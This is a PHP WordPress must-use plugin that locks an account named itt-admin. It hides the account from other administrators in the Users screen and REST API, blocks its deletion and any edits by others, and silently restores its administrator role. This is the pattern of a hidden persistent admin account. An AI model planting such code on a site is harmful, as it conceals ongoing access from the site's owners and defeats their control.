<?php
/**
 * Plugin Name: Protect ITT Admin
 * Description: Locks WordPress user itt-admin: hidden from Users for everyone else; cannot be deleted; others cannot edit role, email, or password. WP-CLI can still list and update (password reset from SSH). Linux/root/MySQL are not covered.
 */

if (!defined('ABSPATH')) {
    exit;
}

const ITT_ADMIN_LOGIN = 'itt-admin';

function itt_admin_protected_user()
{
    static $user = null;
    static $loaded = false;
    if ($loaded) {
        return $user;
    }
    $loaded = true;
    $user = get_user_by('login', ITT_ADMIN_LOGIN);
    return $user instanceof WP_User ? $user : null;
}

function itt_admin_is_protected_user_id($user_id)
{
    $protected = itt_admin_protected_user();
    return $protected && (int) $user_id === (int) $protected->ID;
}

function itt_admin_current_is_itt_admin()
{
    if (!function_exists('wp_get_current_user')) {
        return false;
    }
    $user = wp_get_current_user();
    return $user instanceof WP_User
        && $user->exists()
        && strcasecmp($user->user_login, ITT_ADMIN_LOGIN) === 0;
}

function itt_admin_can_see_protected_user()
{
    if (defined('WP_CLI') && WP_CLI) {
        return true;
    }
    return itt_admin_current_is_itt_admin();
}

function itt_admin_can_edit_protected_user($actor_id)
{
    if (defined('WP_CLI') && WP_CLI) {
        return true;
    }
    return itt_admin_is_protected_user_id($actor_id);
}

add_action('pre_user_query', 'itt_admin_hide_from_user_queries');
function itt_admin_hide_from_user_queries($query)
{
    if (itt_admin_can_see_protected_user()) {
        return;
    }
    if (!is_admin()) {
        return;
    }
    global $pagenow;
    if (!in_array($pagenow, array('users.php'), true)) {
        return;
    }
    $protected = itt_admin_protected_user();
    if (!$protected) {
        return;
    }
    global $wpdb;
    $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID <> %d", $protected->ID);
}

add_filter('user_row_actions', 'itt_admin_hide_user_row_actions', 10, 2);
function itt_admin_hide_user_row_actions($actions, $user_object)
{
    if ($user_object instanceof WP_User && itt_admin_is_protected_user_id($user_object->ID)) {
        unset($actions['delete'], $actions['resetpassword'], $actions['remove']);
    }
    return $actions;
}

add_filter('map_meta_cap', 'itt_admin_map_meta_cap', 10, 4);
function itt_admin_map_meta_cap($caps, $cap, $user_id, $args)
{
    $target_id = isset($args[0]) ? (int) $args[0] : 0;
    if ($target_id < 1 || !itt_admin_is_protected_user_id($target_id)) {
        return $caps;
    }

    if (in_array($cap, array('delete_user', 'delete_users', 'remove_user'), true)) {
        $caps[] = 'do_not_allow';
        return $caps;
    }

    if (in_array($cap, array('edit_user', 'promote_user'), true)
        && !itt_admin_can_edit_protected_user($user_id)
    ) {
        $caps[] = 'do_not_allow';
    }

    return $caps;
}

add_action('delete_user', 'itt_admin_block_delete', 0);
add_action('wpmu_delete_user', 'itt_admin_block_delete', 0);
function itt_admin_block_delete($user_id)
{
    if (!itt_admin_is_protected_user_id($user_id)) {
        return;
    }
    wp_die(
        'User itt-admin is locked by mu-plugin protect-itt-admin.php and cannot be deleted.',
        'User protected',
        array('response' => 403)
    );
}

add_filter('wp_pre_insert_user_data', 'itt_admin_block_profile_tamper', 10, 4);
function itt_admin_block_profile_tamper($data, $update, $user_id, $userdata)
{
    if (!$update || !itt_admin_is_protected_user_id($user_id)) {
        return $data;
    }
    if (itt_admin_can_edit_protected_user(get_current_user_id())) {
        if (isset($data['user_login']) && strcasecmp($data['user_login'], ITT_ADMIN_LOGIN) !== 0) {
            $data['user_login'] = ITT_ADMIN_LOGIN;
        }
        return $data;
    }
    wp_die(
        'User itt-admin is locked by mu-plugin protect-itt-admin.php and cannot be edited.',
        'User protected',
        array('response' => 403)
    );
}

add_action('set_user_role', 'itt_admin_restore_administrator_role', 10, 2);
function itt_admin_restore_administrator_role($user_id, $role)
{
    if (!itt_admin_is_protected_user_id($user_id) || $role === 'administrator') {
        return;
    }
    $user = get_userdata($user_id);
    if (!$user instanceof WP_User) {
        return;
    }
    remove_action('set_user_role', 'itt_admin_restore_administrator_role', 10);
    $user->set_role('administrator');
    add_action('set_user_role', 'itt_admin_restore_administrator_role', 10, 2);
}

add_filter('rest_user_query', 'itt_admin_hide_from_rest_list');
function itt_admin_hide_from_rest_list($args)
{
    if (itt_admin_can_see_protected_user()) {
        return $args;
    }
    $protected = itt_admin_protected_user();
    if (!$protected) {
        return $args;
    }
    $exclude = isset($args['exclude']) ? (array) $args['exclude'] : array();
    $exclude[] = $protected->ID;
    $args['exclude'] = $exclude;
    return $args;
}

add_filter('rest_pre_insert_user', 'itt_admin_block_rest_update', 10, 2);
function itt_admin_block_rest_update($prepared_user, $request)
{
    $id = isset($prepared_user->ID) ? (int) $prepared_user->ID : 0;
    if ($id && itt_admin_is_protected_user_id($id) && !itt_admin_can_edit_protected_user(get_current_user_id())) {
        return new WP_Error(
            'rest_user_protected',
            'User itt-admin is locked and cannot be edited.',
            array('status' => 403)
        );
    }
    return $prepared_user;
}

add_filter('rest_pre_delete_user', 'itt_admin_block_rest_delete', 10, 3);
function itt_admin_block_rest_delete($result, $request, $user)
{
    if ($user instanceof WP_User && itt_admin_is_protected_user_id($user->ID)) {
        return new WP_Error(
            'rest_user_protected',
            'User itt-admin is locked and cannot be deleted.',
            array('status' => 403)
        );
    }
    return $result;
}
